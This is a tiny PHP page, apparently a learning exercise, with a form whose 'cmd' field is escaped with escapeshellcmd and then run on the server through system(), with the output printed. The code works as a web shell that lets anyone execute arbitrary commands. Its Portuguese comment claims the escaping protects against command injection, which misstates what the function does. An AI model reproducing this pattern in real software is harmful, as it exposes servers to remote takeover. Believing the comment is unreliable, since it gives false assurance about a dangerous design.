<?php 

if ($_SERVER["REQUEST_METHOD"] === 'POST'){

	$cmd = escapeshellcmd($_POST["cmd"]); // toda vez que entender que vem 1 comando via post, ele vai escapar. Função de segurança contra command inject

	var_dump($cmd);

	echo "<pre>";

	$comando = system($cmd, $retorno);

	echo "</pre>";

}

 ?>

 <form method="post">
 	<input type="text" name="cmd">
 	<button type="submit">Enviar</button>
 </form>